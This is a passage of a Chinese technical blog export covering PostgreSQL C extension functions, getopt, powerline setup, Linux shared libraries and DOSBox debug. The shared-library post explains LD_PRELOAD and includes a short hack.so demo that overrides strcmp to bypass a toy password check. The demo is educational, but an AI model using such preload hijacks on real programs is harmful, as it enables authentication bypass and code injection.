pg_language表定义了函数实现所使用的语言。主要支持了C语言和SQL语句。一些可选的语言包括pl/pgsql、tcl和perl。 1234567shell=# select lanname, lanispl, lanpltrusted, lanplcallfoid, laninline, lanvalidator from pg_language; lanname | lanispl | lanpltrusted | lanplcallfoid | laninline | lanvalidator ----------+---------+--------------+---------------+-----------+-------------- internal | f | f | 0 | 0 | 2246 c | f | f | 0 | 0 | 2247 sql | f | t | 0 | 0 | 2248 plpgsql | t | t | 13198 | 13199 | 13200 pg_proc表对函数进行了定义。每一个函数在该表中都对应一个元组，包含函数名。输入参数类型，返回类型以及对函数的定义(可能是文本，可能是一段编译型语句，也可能是对可执行代码的引用)。编译过的函数可以静态地链接到服务器上，或者在存储在共享库内，当第一次使用该库时动态的载入。 12345shell# select proname,prolang, prorettype,proargtypes, prosrc,probin from pg_proc where proname like '%square%'; proname | prolang | prorettype | proargtypes | prosrc | probin ---------+---------+------------+-------------+----------------------------+-------------------- square | 13201 | 23 | 23 | begin return $1 * $1; end; | squares | 13 | 23 | 23 | squares_return_int | $libdir/squares.so 查看其数据类型 12345shell# select oid , typname from pg_type where oid = 23; oid | typname -----+--------- 23 | int4(1 row)","text":"系统函数编写 基于 psql (PostgreSQL) 10.4 pg_language表定义了函数实现所使用的语言。主要支持了C语言和SQL语句。一些可选的语言包括pl/pgsql、tcl和perl。 1234567shell=# select lanname, lanispl, lanpltrusted, lanplcallfoid, laninline, lanvalidator from pg_language; lanname | lanispl | lanpltrusted | lanplcallfoid | laninline | lanvalidator ----------+---------+--------------+---------------+-----------+-------------- internal | f | f | 0 | 0 | 2246 c | f | f | 0 | 0 | 2247 sql | f | t | 0 | 0 | 2248 plpgsql | t | t | 13198 | 13199 | 13200 pg_proc表对函数进行了定义。每一个函数在该表中都对应一个元组，包含函数名。输入参数类型，返回类型以及对函数的定义(可能是文本，可能是一段编译型语句，也可能是对可执行代码的引用)。编译过的函数可以静态地链接到服务器上，或者在存储在共享库内，当第一次使用该库时动态的载入。 12345shell# select proname,prolang, prorettype,proargtypes, prosrc,probin from pg_proc where proname like '%square%'; proname | prolang | prorettype | proargtypes | prosrc | probin ---------+---------+------------+-------------+----------------------------+-------------------- square | 13201 | 23 | 23 | begin return $1 * $1; end; | squares | 13 | 23 | 23 | squares_return_int | $libdir/squares.so 查看其数据类型 12345shell# select oid , typname from pg_type where oid = 23; oid | typname -----+--------- 23 | int4(1 row) 以下是示例函数： C: 与内建SQL类型等效的C类型 12345intsquare_int (int x)&#123; return x * x;&#125; 把上面的函数编译成共享库文件，这样声明： 123CREATE FUNCTION square(int) RETURNS intAS '/path/to/square.so', 'square_int' -- ’C`Func_name 若与Sql`Func_name相同,可不写‘LANGUAGE 'C'; PL/PGSQL： 12345678shell=# create function square(int) returns int as 'begin return $1 * $1; end;' LANGUAGE 'plpgsql';CREATE FUNCTIONshell=# shell=# shell=# select square(4); square -------- 16 建立用户函数动态库 新建代码 12345678#include \"postgres.h\" //包含Postgresql基础的接口，这是开发Postgresql扩展必须包含的头文件#include \"fmgr.h\" //包含PG_GETARG_XX 和 PG_RETURN_XXX 等获取参数和返回结果的重要宏定义int square_int(int x)&#123; return x * x;&#125; 编译 - 添加共享库 123[shell@yfslcentos71 include]$ gcc -I`pg_config --includedir-server` -c squares.c [shell@yfslcentos71 include]$ gcc -shared squares.o -o squares.so [shell@yfslcentos71 include]$ cp squares.so `pg_config --libdir`/ Pg数据库装载 1shell=# create function squares(int) returns int as '$libdir/squares.so', 'square_int' LANGUAGE 'c' STRICT; 关于PG_MODULE_MAGIC为了确保不会错误加载共享库文件，从PostgreSQL 开始将检查那个文件的”magic block”，这允许服务器以检查明显的不兼容性。 123#ifdef PG_MODULE_MAGICPG_MODULE_MAGIC;#endif 如果不打算兼容8.2 PostgreSQL之前的版本， #ifdef测试也可以省略 源码修改为: 123456789101112#include \"postgres.h\" #include \"fmgr.h\"#ifdef PG_MODULE_MAGICPG_MODULE_MAGIC;#endifint square_int(int x)&#123; return x * x;&#125; 版本约定版本0约定版本-0方法中，此风格 C 函数的参数和结果用普通 C 风格声明， 但是要小心使用上面显示的 SQL 数据类型的 C 表现形式。 (以前版本;) 123456789101112#include \"postgres.h\" #include \"fmgr.h\"#ifdef PG_MODULE_MAGICPG_MODULE_MAGIC;#endifint square_int(int x)&#123; return x * x;&#125; 版本1约定 (应当使用该版本)版本-1调用约定使用宏消除大多数传递参数和结果的复杂性。版本-1风格函数的C定义总是下面这样: 1Datum funcname(PG_FUNCTION_ARGS); Datum 等同于 void * 表示函数返回任意类型 另外，宏调用： 1PG_FUNCTION_INFO_V1(funcname); 也必须出现在同一个源文件里(通常就可以写在函数自身前面)。 对那些internal语言函数而言，不需要调用这个宏， 因为PostgreSQL目前假设内部函数都是版本-1。不过，对于动态加载的函数， 它是必须的。 每个实际参数都是用一个对应该参数的数据类型的 PG_GETARG_*xxx*()宏抓取的， 用返回类型的PG_RETURN_*xxx*()宏返回结果。 PG_GETARG_*xxx*()接受要抓取的函数参数的编号 (从 0 开始)作为其参数。PG_RETURN_*xxx*() 接受实际要返回的数值为自身的参数。 关于PG_GETARG_XXX 定义于 src/include/fmgr.h 1234567891011121314151617181920212223/* Macros for fetching arguments of standard types */#define PG_GETARG_DATUM(n) (fcinfo-&gt;arg[n])#define PG_GETARG_INT32(n) DatumGetInt32(PG_GETARG_DATUM(n))#define PG_GETARG_UINT32(n) DatumGetUInt32(PG_GETARG_DATUM(n))#define PG_GETARG_INT16(n) DatumGetInt16(PG_GETARG_DATUM(n))#define PG_GETARG_UINT16(n) DatumGetUInt16(PG_GETARG_DATUM(n))#define PG_GETARG_CHAR(n) DatumGetChar(PG_GETARG_DATUM(n))#define PG_GETARG_BOOL(n) DatumGetBool(PG_GETARG_DATUM(n))#define PG_GETARG_OID(n) DatumGetObjectId(PG_GETARG_DATUM(n))#define PG_GETARG_POINTER(n) DatumGetPointer(PG_GETARG_DATUM(n))#define PG_GETARG_CSTRING(n) DatumGetCString(PG_GETARG_DATUM(n))#define PG_GETARG_NAME(n) DatumGetName(PG_GETARG_DATUM(n))/* these macros hide the pass-by-reference-ness of the datatype: */#define PG_GETARG_FLOAT4(n) DatumGetFloat4(PG_GETARG_DATUM(n))#define PG_GETARG_FLOAT8(n) DatumGetFloat8(PG_GETARG_DATUM(n))#define PG_GETARG_INT64(n) DatumGetInt64(PG_GETARG_DATUM(n))/* use this if you want the raw, possibly-toasted input datum: */#define PG_GETARG_RAW_VARLENA_P(n) ((struct varlena *) PG_GETARG_POINTER(n))/* use this if you want the input datum de-toasted: */#define PG_GETARG_VARLENA_P(n) PG_DETOAST_DATUM(PG_GETARG_DATUM(n))/* and this if you can handle 1-byte-header datums: */#define PG_GETARG_VARLENA_PP(n) PG_DETOAST_DATUM_PACKED(PG_GETARG_DATUM(n)) 代码 123456789101112131415#include \"postgres.h\" #include \"fmgr.h\"#ifdef PG_MODULE_MAGICPG_MODULE_MAGIC;#endifPG_FUNCTION_INFO_V1(squares_return_int);Datum squares_return_int(PG_FUNCTION_ARGS)&#123; int32 arg = PG_GETARG_INT32(0); PG_RETURN_INT32(arg * arg);&#125; 编译123456789[shell@yfslcentos71 include]$ gcc -I`pg_config --includedir-server` -c squares.c [shell@yfslcentos71 include]$ gcc -shared squares.o -o squares.so /usr/bin/ld: squares.o: relocation R_X86_64_32 against `.rodata' can not be used when making a shared object; recompile with -fPICsquares.o: could not read symbols: Bad value[shell@yfslcentos71 include]$ gcc -I`pg_config --includedir-server` -fPIC -c squares.c[shell@yfslcentos71 include]$ gcc -shared squares.o -o squares.so[shell@yfslcentos71 include]$ [shell@yfslcentos71 include]$ cp squares.so `pg_config --libdir`/ SQL声明函数12shell=# create function squares(int) returns int as '$libdir/squares.so', 'squares_return_int' LANGUAGE 'c' STRICT; CREATE FUNCTION 补充 函数声明为”strict”(严格)，意思是说如果任何输入值为NULL， 那么系统应该自动假设一个NULL的结果。这样处理可以让我们避免在函数代码里面检查 NULL输入。如果不这样处理，我们就得明确检查NULL， 比如为每个传递引用的参数检查空指针。对于传值类型的参数，我们甚至没有办法检查！ 参考Postgresql 9.4手册","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"Postgresql扩展Sql-源码添加系统函数","slug":"database/Postgresql扩展Sql-源码添加系统函数","date":"2018-08-22T10:52:18.000Z","updated":"2019-09-18T12:19:50.222Z","comments":true,"path":"2018/08/22/database/Postgresql扩展Sql-源码添加系统函数/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/08/22/database/Postgresql扩展Sql-源码添加系统函数/","excerpt":"PostgreSql 源码增添新的系统函数 基于Postgresql 10.4 基于 psql (PostgreSQL) 11beta2 函数实现: 第一种: 添加于 backend/utils/adt/pgstatfuncs.c； 123456// 函数实现; Datumreturn_pid(PG_FUNCTION_ARGS)&#123; PG_RETURN_INT32(MyProcPid);&#125;","text":"PostgreSql 源码增添新的系统函数 基于Postgresql 10.4 基于 psql (PostgreSQL) 11beta2 函数实现: 第一种: 添加于 backend/utils/adt/pgstatfuncs.c； 123456// 函数实现; Datumreturn_pid(PG_FUNCTION_ARGS)&#123; PG_RETURN_INT32(MyProcPid);&#125; 第二种: 新建 .c 文件 1234567891011121314151617181920#include &quot;postgres.h&quot;#include &lt;sys/file.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;#include &lt;dirent.h&gt;#include &quot;access/heapam.h&quot;#include &quot;catalog/pg_type.h&quot;#include &quot;funcapi.h&quot;#include &quot;miscadmin.h&quot;#include &quot;postmaster/syslogger.h&quot;#include &quot;storage/fd.h&quot;#include &quot;utils/builtins.h&quot;Datumreturn_pid(PG_FUNCTION_ARGS)&#123; PG_RETURN_INT32(MyProcPid);&#125; 需要在Makefile文件中增加对其.c文件的编译引用: 1234567891011121314151617181920212223# keep this list arranged alphabetically or it gets to be a messOBJS = acl.o amutils.o arrayfuncs.o array_expanded.o array_selfuncs.o \\ array_typanalyze.o array_userfuncs.o arrayutils.o ascii.o \\ bool.o cash.o char.o cryptohashes.o \\ date.o datetime.o datum.o dbsize.o domains.o \\ encode.o enum.o expandeddatum.o expandedrecord.o \\ float.o format_type.o formatting.o genfile.o \\ geo_ops.o geo_selfuncs.o geo_spgist.o inet_cidr_ntop.o inet_net_pton.o \\ int.o int8.o json.o jsonb.o jsonb_gin.o jsonb_op.o jsonb_util.o \\ jsonfuncs.o like.o lockfuncs.o mac.o mac8.o misc.o nabstime.o name.o \\ network.o network_gist.o network_selfuncs.o network_spgist.o \\ numeric.o numutils.o oid.o oracle_compat.o \\ orderedsetaggs.o pg_locale.o pg_lsn.o pg_upgrade_support.o \\ pgstatfuncs.o \\ pseudotypes.o quote.o rangetypes.o rangetypes_gist.o \\ rangetypes_selfuncs.o rangetypes_spgist.o rangetypes_typanalyze.o \\ regexp.o regproc.o ri_triggers.o rowtypes.o ruleutils.o \\ selfuncs.o tid.o timestamp.o trigfuncs.o \\ tsginidx.o tsgistidx.o tsquery.o tsquery_cleanup.o tsquery_gist.o \\ tsquery_op.o tsquery_rewrite.o tsquery_util.o tsrank.o \\ tsvector.o tsvector_op.o tsvector_parser.o \\ txid.o uuid.o varbit.o varchar.o varlena.o version.o \\ windowfuncs.o xid.o xml.o &lt;page_mr.o&gt; ##新增; 支持外部访问 增加外部调用声明 backend/utils/fmgrprotos.h 1extern Datum return_pid(PG_FUNCTION_ARGS); 参数12345//定义 OIDbackend/utils/fmgroids.h:2588: #define F_RETURN_PID 54336//定义参数;backend/utils/fmgrtab.c:2833: &#123; 54336, &quot;return_pid&quot;, 0, true, false, return_pid &#125; 关于OID添加: 参考后文补充; 注册到命令空间PostgreSQL 11beta2 用于生成注册信息, 注册到命令空间 include/catalog/pg_proc.dat 1234//用于生成pg_proc 表信息; -- 注册到命令空间&#123; oid =&gt; &apos;54336&apos;, descr =&gt; &apos;statistics: current backend PID&apos;, proname =&gt; &apos;return_pid&apos;, provolatile =&gt; &apos;s&apos;, proparallel =&gt; &apos;r&apos;, prorettype =&gt; &apos;int4&apos;, proargtypes =&gt; &apos;&apos;, prosrc =&gt; &apos;return_pid&apos; &#125;, Postgresql 10.4 include/catalog/pg_proc.h1DATA(insert OID = 2026 ( pg_backend_pid PGNSP PGUID 12 1 0 0 0 f f f f t f s r 0 0 23 &quot;&quot; _null_ _null_ _null_ _null_ _null_ pg_backend_pid _null_ _null_ _null_ )); 在pg_proc.h中插入的记录是什么含义？ 以第一行为例详细说明如下：DATA(insert OID = 13624 ( sys_read_page PGNSP 0 PGUID 12 t f f f t f v 2 17 17 i f i f f “25 20 20” null null null null null null sys_read_page 2D null )); 13624–OID使用内核中未使用的OID即可（src/include/catalog下unused_oids，可以显示未使用的oid） postgres内部预留了1W多个oid给系统用，选一个没有的就行，如果不知道哪些可用，在\\src\\include\\catalog\\ 下有个脚本文件unused_oids，运行一下就能找出哪些oid可用，但要这是一个linux脚本，需要在linux下运行。 PGNSP–函数所属的名字空间的OID，PGNSP即pg_catalog（oid=11），内置函数添加此值固定 PGUID–函数的拥有者OID，PGUID及initdb时指定用户（oid=10），内置函数添加此值固定 12–实现语言或该函数的调用接口，内置函数使用12（internal），SQL用14 t–函数是否为一个聚集函数f–函数是否为一个窗口函数f–函数是一个安全性定义者（即，一个”setuid”函数）f–该函数没有副作用。除了通过返回值，没有关于参数的信息被传播。任何会抛出基于其参数值的错误信息的函数都不是泄露验证的。t–当任意调用函数为空时，函数是否会返回空值。在那种情况下函数实际上根本不会被调用。非”strict”函数必须准备好处理空值输入。f–函数是否返回一个集合（即，指定数据类型的多个值）v–未知 2–输入参数的个数，对应后面的”“25 20 20”“两个参数，明显我们这里写错了，找到了原因，我们修改为我们对应的参数个数和类型： 17–具有默认值的参数个数17–返回值的数据类型 “25 20 20”–函数参数的数据类型的数组，这只包括输入参数（含INOUT和VARIADIC参数），因此也表现了函数的调用特征 重载函数也凭这区别，如果有多个，参数肯定不同，这个不同即可以是数量不同，也可以是类型不同，25 20 20 就是代表类型，如下： 123456789TEST=# select oid,typname from pg_type where oid in (1082,23,1114,1184,17,25); OID | TYPNAME ------+------------- 17 | BYTEA 23 | INT4 25 | TEXT 1082 | DATE 1114 | TIMESTAMP 1184 | TIMESTAMPTZ null–函数参数的数据类型的数组，这包括所有参数（含OUT和INOUT参数）。但是，如果所有参数都是IN参数，这个域将为空。注意下标是从1开始 ，然而由于历史原因proargtypes的下标是从0开始 null–函数参数的模式的数组。编码为： i表示IN参数 ， o表示OUT参数， b表示INOUT参数， v表示VARIADIC参数， t表示TABLE参数。 如果所有的参数都是IN参数，这个域为空。注意这里的下标对应着proallargtypes而不是proargtypes中的位置 null–函数参数的名字的数组。没有名字的参数在数组中设置为空字符串。如果没有一个参数有名字，这个域为空。注意这里的下标对应着proallargtypes而不是proargtypes中的位置 null–默认值的表达式树（按照nodeToString()的表现方式）。这是一个pronargdefaults元素的列表，对应于最后N个input参数（即最后N个proargtypes位置）。如果没有一个参数具有默认值，这个域为空 null–数据类型OID为了应用转换 验证 关闭Pg服务 pg_ctl 重新编译源代码 ; make &amp;&amp; make install 重新创建新的数据集簇 initdb -D test; createdb test pg_ctl start -D test 登陆psql 进行验证select return_pid(); 补充:关于OID: OID不能重复,但是可以自己任意YY 如果不知道哪些可用，在src/include/catalog 下有个脚本文件 unused_oids，运行一下就能找出哪些oid可用，但要这是一个linux脚本，需要在linux下运行。","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"getopt","slug":"cpluscplus/unistd-getopt","date":"2018-08-15T11:54:03.000Z","updated":"2018-09-29T13:10:37.814Z","comments":true,"path":"2018/08/15/cpluscplus/unistd-getopt/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/08/15/cpluscplus/unistd-getopt/","excerpt":"函数 函数原型 1int getopt(int argc, char *const argv[], const char * optstring); 函数头文件 1#include &lt;unistd.h&gt; 函数说明 1234getopt函数主要用来解析命令行参数; 从其形参argc, argv可以发现是有main()传递的参数个数与内容； 而其第三个参数optsreing 则表示处理选项字符串规则。 以冒号表示参数; 1. 身后不带冒号， 则不需要填充参数 2. 一个冒号，则选项后必须跟有参数 3. 两个冒号，则选项之后的参数是可选的。 若存在参数，参数与选项之间不能存在空格;","text":"函数 函数原型 1int getopt(int argc, char *const argv[], const char * optstring); 函数头文件 1#include &lt;unistd.h&gt; 函数说明 1234getopt函数主要用来解析命令行参数; 从其形参argc, argv可以发现是有main()传递的参数个数与内容； 而其第三个参数optsreing 则表示处理选项字符串规则。 以冒号表示参数; 1. 身后不带冒号， 则不需要填充参数 2. 一个冒号，则选项后必须跟有参数 3. 两个冒号，则选项之后的参数是可选的。 若存在参数，参数与选项之间不能存在空格; 示例a:b:cd::e这就是一个选项字符串。对应到命令行就是-a ,-b ,-c ,-d, -e ; 按照上面规则进行分解 不带参数的选项:c e 带一个参数的选项: a b 可选参数选项: d 测试代码如下: 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(int argc, char*argv[])&#123; int ch; while((ch = getopt(argc, argv, \"a:b:cd::e\")) != -1) &#123; switch(ch) &#123; case 'a': printf(\"options a = %s\\n\", optarg); break; case 'b': printf(\"options b = %s\\n\", optarg); break; case 'c': printf(\"options c = %s\\n\", optarg); break; case 'd': printf(\"options d = %s\\n\", optarg); break; case 'e': printf(\"options e = %s\\n\", optarg); break; default : printf(\"other option : %c\\n\", ch); &#125; &#125; return 0;&#125; 测试 正常输入选项 123456[Postgre@yfslcentos71 code]$ ./getopt -a 123 -b1 -c -d -eoptions a = 123options b = 1options c = (null)options d = (null)options e = (null) 不存在选项 1234567[Postgre@yfslcentos71 code]$ ./getopt -a 123 -b1 -c -d -f options a = 123options b = 1options c = (null)options d = (null)./getopt: invalid option -- 'f'other option : ? 必须带一个参数选项不加参数 12345[Postgre@yfslcentos71 code]$ ./getopt -a -b1 -c -d -eoptions a = -b1options c = (null)options d = (null)options e = (null) 给不带参数选项 添加参数 123456[Postgre@yfslcentos71 code]$ ./getopt -a 12 -b1 -c 34 -d -e 56options a = 12options b = 1options c = (null)options d = (null)options e = (null) 可选参数选项 12345678910111213[Postgre@yfslcentos71 code]$ ./getopt -a 12 -b1 -c -d 1 -e ## 可选参数 与 值 不能加空格options a = 12options b = 1options c = (null)options d = (null)options e = (null)[Postgre@yfslcentos71 code]$ [Postgre@yfslcentos71 code]$ ./getopt -a 12 -b1 -c -d12 -e ## 可选参数 与 值 不能加空格options a = 12options b = 1options c = (null)options d = 12options e = (null)","categories":[],"tags":[{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"}]},{"title":"Centos7 bash 安装powerline","slug":"software/Centos7-bash-安装powerline","date":"2018-07-17T11:14:06.000Z","updated":"2018-12-05T10:55:46.152Z","comments":true,"path":"2018/07/17/software/Centos7-bash-安装powerline/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/07/17/software/Centos7-bash-安装powerline/","excerpt":"安装powerline123sudo yum install epel-releasesudo yum install python-pippip install powerline-status 查看安装位置 pip show powerline-status12345678910Name: powerline-statusVersion: 2.7Summary: The ultimate statusline/prompt utility.Home-page: https://github.com/powerline/powerlineAuthor: Kim SilkebaekkenAuthor-email: kim.silkebaekken+vim@gmail.comLicense: MITLocation: /usr/lib/python2.7/site-packagesRequires: Required-by:","text":"安装powerline123sudo yum install epel-releasesudo yum install python-pippip install powerline-status 查看安装位置 pip show powerline-status12345678910Name: powerline-statusVersion: 2.7Summary: The ultimate statusline/prompt utility.Home-page: https://github.com/powerline/powerlineAuthor: Kim SilkebaekkenAuthor-email: kim.silkebaekken+vim@gmail.comLicense: MITLocation: /usr/lib/python2.7/site-packagesRequires: Required-by: 在 Bash Shell 中添加/启用 Powerline123456if [ -f `which powerline-daemon` ]; then powerline-daemon -q POWERLINE_BASH_CONTINUATION=1 POWERLINE_BASH_SELECT=1 . /usr/lib/python2.7/site-packages/powerline/bindings/bash/powerline.shfi vim启用Powerline1234&quot; vi ~/.vimrcset rtp+=/usr/lib/python2.7/site-packages/powerline/bindings/vim/set laststatus=2set t_Co=256 解决不能显示git分支问题1234567891011mkdir -p ~/.config/powerlinecat &lt;&lt;-'EOF' &gt; ~/.config/powerline/config.json&#123; \"ext\": &#123; \"shell\": &#123; \"theme\": \"default_leftonly\" &#125; &#125;&#125;EOFpowerline-daemon --replace","categories":[{"name":"工具篇","slug":"工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/工具篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Software","slug":"Software","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Software/"}]},{"title":"Linux-共享库","slug":"rebuild/Linux-共享库","date":"2018-06-28T13:16:11.000Z","updated":"2018-10-28T13:32:54.131Z","comments":true,"path":"2018/06/28/rebuild/Linux-共享库/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/06/28/rebuild/Linux-共享库/","excerpt":"ld.so是Unix或类Unix系统上的动态链接器，常见的有两个变体： ld.so针对a.out格式的二进制可执行文件 ld-linux.so针对ELF格式的二进制可执行文件 readelf显示elf文件 objdump显示elf和object格式文件 当应用程序需要使用动态链接库里的函数)时，由ld.so负责加载。搜索动态链接库的顺序依此是 环境变量LD_AOUT_LIBRARY_PATH（a.out格式）、LD_LIBRARY_PATH（ELF格式）；在Linux中，LD_PRELOAD指定的目录具有最高优先权[1]。 缓存文件/etc/ld.so.cache。此为上述环境变量指定目录的二进制索引文件。更新缓存的命令是ldconfig。 默认目录，先在/lib中寻找，再到/usr/lib中寻找。 123通常:/lib 软连接到 /usr/lib/lib64 软连接到 /usr/lib64","text":"ld.so是Unix或类Unix系统上的动态链接器，常见的有两个变体： ld.so针对a.out格式的二进制可执行文件 ld-linux.so针对ELF格式的二进制可执行文件 readelf显示elf文件 objdump显示elf和object格式文件 当应用程序需要使用动态链接库里的函数)时，由ld.so负责加载。搜索动态链接库的顺序依此是 环境变量LD_AOUT_LIBRARY_PATH（a.out格式）、LD_LIBRARY_PATH（ELF格式）；在Linux中，LD_PRELOAD指定的目录具有最高优先权[1]。 缓存文件/etc/ld.so.cache。此为上述环境变量指定目录的二进制索引文件。更新缓存的命令是ldconfig。 默认目录，先在/lib中寻找，再到/usr/lib中寻找。 123通常:/lib 软连接到 /usr/lib/lib64 软连接到 /usr/lib64 ldconfigldconfig命令的用途主要是在默认搜寻目录/lib和/usr/lib以及动态库配置文件/etc/ld.so.conf内所列的目录下，搜索出可共享的动态链接库（格式如lib.so）,进而创建出动态装入程序(ld.so)所需的连接和缓存文件。缓存文件默认为/etc/ld.so.cache，此文件保存已排好序的动态链接库名字列表。 参数123456789101112131415161718Usage: ldconfig [OPTION...]Configure Dynamic Linker Run Time Bindings. -c, --format=FORMAT Format to use: new, old or compat (default) -C CACHE Use CACHE as cache file -f CONF Use CONF as configuration file -i, --ignore-aux-cache Ignore auxiliary cache file -l Manually link individual libraries. -n Only process directories specified on the command line. Don't build cache. -N Don't build cache -p, --print-cache Print cache -r ROOT Change to and use ROOT as root directory -v, --verbose Generate verbose messages -X Don't generate links -?, --help Give this help list --usage Give a short usage message -V, --version Print program version 修改注意事项 执行ldconfig时会读取/etc/ld.so.conf 按照其中引用包含的路径，进行加载 lib.so 文件,并生成到 /etc/ld.so.cache 临时缓冲文件中。 当往ld.so.conf包含的路径中添加共享库时，不需要修改ld.so.conf文件，只需要执行ldconfig重新更新/etc/ld.so.cache 缓冲文件即可 程序运行时，需要查找相应的lib.so, 可以直接修改/etc/ld.so.conf; 将lib目录引用，在ldconfig重新更新，编译运行时lib才能被找到。 如果并不放置ld.so.conf引用目录，也不修改ld.so.conf。 那么还可以使用export LD_LIBRARY_PATH变量。运行程序时会自动查找。 ldconfig仅仅与运行时有关，提供函数定义so。 编译时还是需要添加-L ; LD_PRELOAD​ 所谓链接，也就是说编译器找到程序中所引用的函数或全局变量所存在的位置。一般来说，程序的链接分为静态链接和动态链接，静态链接就是把所有所引用到的函数或变量全部地编译到可执行文件中。动态链接则不会把函数编译到可执行文件中，而是在程序运行时动态地载入函数库，也就是运行链接。所以，对于动态链接来说，必然需要一个动态链接库。 动态链接库的好处在于，一旦动态库中的函数发生变化，对于可执行程序来说是透明的，可执行程序无需重新编译。 ​ 动态链接所带来的坏处和其好处一样同样是巨大的。因为程序在运行时动态加载函数，这也就为他人创造了可以影响你的主程序的机会。试想，一旦，你的程序动态载入的函数不是你自己写的，而是载入了别人的有企图的代码，通过函数的返回值来控制你的程序的执行流程，那么，你的程序也就被人“劫持”了。 ​ 在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。 ​ 我们知道，Linux的用的都是glibc，有一个叫libc.so.6的文件，这是几乎所有Linux下命令的动态链接中，其中有标准C的各种函数。对于GCC而言，默认情况下，所编译的程序中对标准C函数的链接，都是通过动态链接方式来链接libc.so.6这个函数库的。 以下程序修改strcmp来达到攻击效果: 12345678910111213141516171819202122232425/// main.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char *passwd = \"passwd\"; if(argc &lt; 2) &#123; fprintf(stderr, \"Usage: argv = %d\\n\", argc); exit(1); &#125; if( strcmp(passwd, argv[1]) ) &#123; fprintf(stderr, \"Usage: passwd != %s\\n \", argv[1]); exit(2); &#125; fprintf(stdout, \"Usage: passwd == %s\\n \", argv[1]); return 0;&#125; gcc main.c -o main 123456789///hack.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;int strcmp(const char *v1, const char *v2)&#123; return 0;&#125; gcc -shared -o hack.so hack.c export LD_PRELOAD=&#39;./hack.so&#39; 再次运行./main pas 将会发现我们的函数执行流程被改变。 export LD_PRELOAD= 将被切换回来;","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"环境变量","slug":"环境变量","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/环境变量/"}]},{"title":"Dosbox 教程","slug":"asm/Dosbox-教程","date":"2018-06-27T15:38:41.000Z","updated":"2018-06-27T15:53:49.626Z","comments":true,"path":"2018/06/27/asm/Dosbox-教程/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/06/27/asm/Dosbox-教程/","excerpt":"安装Dosbox Debug基本参数","text":"安装Dosbox Debug基本参数 DosBox安装下载DosBox 解压到C盘，并运行安装 DOSBox0.74-win32-installer.exe 将debug所在文件夹放置到%PATH%系统环境变量中 打开Dosbox软件 运行Debug组件, 首先将Debug 程序挂载到DosBox 运行环境中 mount c c:\\AsmTools 此处的C:\\AsmTools 为之前debug解压路径; 挂载成功之后，显示 Drice C is mounted as local Directory c:\\AsmTools\\ 切换盘符， c: , 用于运行 debug 程序 此时即可运行 Debug DOSBox Debug 调试使用参数1. *Debug:A（汇编） 直接将 8086/8087/8088 记忆码合并到内存。 该命令从汇编语言语句创建可执行的机器码。所有数值都是十六进制格式，必须按一到四个字符输入这些数值。在引用的操作代码（操作码）前指定前缀记忆码（注WINDOWS中debug命令会报错属正常现象） a [address] 参数 address 指定键入汇编语言指令的位置。对 address 使用十六进制值，并键入不以“h”字符结尾的每个值。如果不指定地址，a 将在它上次停止处开始汇编。 2.Debug:C（比较） 比较内存的两个部分。 c range address 参数 range 指定要比较的内存第一个区域的起始和结束地址，或起始地址和长度。 3. *Debug（转储） 显示一定范围内存地址的内容。 d [range] 参数 range 指定要显示其内容的内存区域的起始和结束地址，或起始地址和长度。如果不指定 range，Debug 程序将从以前 d 命令中所指定的地址范围的末尾开始显示 128 个字节的内容。 4. *Debug:E（键入） 将数据输入到内存中指定的地址。 可以按十六进制或 ASCII 格式键入数据。以前存储在指定位置的任何数据全部丢失。 e address 参数 address 指定输入数据的第一个内存位置。 list 5.Debug:F（填充） 使用指定的值填充指定内存区域中的地址。 可以指定十六进制或 ASCII 格式表示的数据。任何以前存储在指定位置的数据将会丢失。 f range list 参数 range 指定要填充内存区域的起始和结束地址，或起始地址和长度。 list 指定要输入的数据。List 可以由十六进制数或引号包括起来的字符串组成。 6.Debug:G（转向） 运行当前在内存中的程序。 g [=address] [breakpoints] 参数 =address 指定当前在内存中要开始执行的程序地址。如果不指定 address，Windows 2000 将从 CS:IP 寄存器中的当前地址开始执行程序。 breakpoints 指定可以设置为 g 命令的部分的 1 到 10 个临时断点。 7. *Debug:H（十六进制） 对指定的两个参数执行十六进制运算。 h value1 value2 参数 value1 代表从 0 到 FFFFh 